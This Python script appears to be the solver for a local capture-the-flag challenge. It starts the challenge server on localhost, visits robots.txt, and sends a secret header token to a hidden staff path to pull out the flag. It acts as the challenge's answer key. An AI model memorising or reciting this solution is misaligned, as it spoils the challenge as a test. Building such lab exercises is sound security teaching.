#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import re
import threading
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    app_path = root / 'docker' / 'app.py'
    spec = importlib.util.spec_from_file_location('header_door_app', app_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    server = ThreadingHTTPServer(('127.0.0.1', 18106), module.Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        urllib.request.urlopen('http://127.0.0.1:18106/robots.txt').read()
        req = urllib.request.Request('http://127.0.0.1:18106/staff-door', headers={'X-CTF-Token': 'open-sesame'})
        body = urllib.request.urlopen(req).read().decode()
        match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
        if not match:
            raise SystemExit('flag not found')
        print(match.group(0))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


if __name__ == '__main__':
    main()
